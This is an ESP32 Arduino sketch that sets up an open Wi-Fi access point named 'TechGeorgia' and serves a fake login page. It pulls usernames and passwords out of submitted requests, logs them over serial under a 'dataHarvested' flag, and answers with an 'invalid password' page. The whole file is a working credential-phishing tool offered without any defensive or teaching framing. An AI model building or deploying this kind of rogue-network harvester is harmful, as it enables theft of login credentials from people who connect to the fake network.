#include "WiFi.h"
#include <string.h>
#include "site.h"

const char *ssid = "TechGeorgia";
const char *password = "";

WiFiServer server(80);

String header;

String output26State = "off";
String output27State = "off";

const char* USER_INPUT = "username=";
const char* PASS_INPUT = "password=";

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, NULL);

  Serial.println();
  Serial.print("IP address :");
  Serial.println(WiFi.softAPIP());
  
  server.begin();
}

void loop(){
  WiFiClient client = server.available();
  if (client) {                             // If a new client connects,
    Serial.println("New Client.");          // print a message out in the serial port
    String currentLine = "";                // make a String to hold incoming data from the client
    while (client.connected()) {            // loop while the client's connected
      if (client.available()) {             // if there's bytes to read from the client,
        char c = client.read();             // read a byte, then
        Serial.write(c);                    // print it out the serial monitor
        header += c;
        if (c == '\n') {                    // if the byte is a newline character
          // if the current line is blank, you got two newline characters in a row.
          // that's the end of the client HTTP request, so send a response:
          if (currentLine.length() == 0) {
            // HTTP headers always start with a response code (e.g. HTTP/1.1 200 OK)
            // and a content-type so the client knows what's coming, then a blank line:
            client.println("HTTP/1.1 200 OK");
            client.println("Content-type:text/html");
            client.println("Connection: close");
            client.println();
            
            Serial.print(header);
            String user = "";
            String pass = "";
            
            bool dataHarvested = false;
            if (header.indexOf(USER_INPUT) >= 0) {
              for(int i = header.indexOf(USER_INPUT)+strlen(USER_INPUT); i < 100; i++) {
                if (header[i] == ' ' || header[i] == '&') {
                  break;
                } else {
                  user=user+header[i];
                }
              }
              if (strlen(user.c_str())>0) {
                dataHarvested = true;
                Serial.println("Username: "+user);
              }
            }

            if (header.indexOf(PASS_INPUT) >= 0) {
              for(int i = header.indexOf(PASS_INPUT)+strlen(PASS_INPUT); i < 100; i++) {
                if (header[i] == ' ' || header[i] == '&') {
                  break;
                } else {
                  pass=pass+header[i];
                }
              }
              if (strlen(pass.c_str())>0) {
                dataHarvested = true;
                Serial.println("Password: "+pass);
              }
            }
            
            // Display the HTML web page
            if (dataHarvested) {
              client.println(invalid_pass_index_html);
            } else {
              client.println(index_html);
            }
            // The HTTP response ends with another blank line
            client.println();
            // Break out of the while loop
            break;
          } else { // if you got a newline, then clear currentLine
            currentLine = "";
          }
        } else if (c != '\r') {  // if you got anything else but a carriage return character,
          currentLine += c;      // add it to the end of the currentLine
        }
      }
    }
    // Clear the header variable
    header = "";
    // Close the connection
    client.stop();
    Serial.println("Client disconnected.");
    Serial.println("");
  }
}
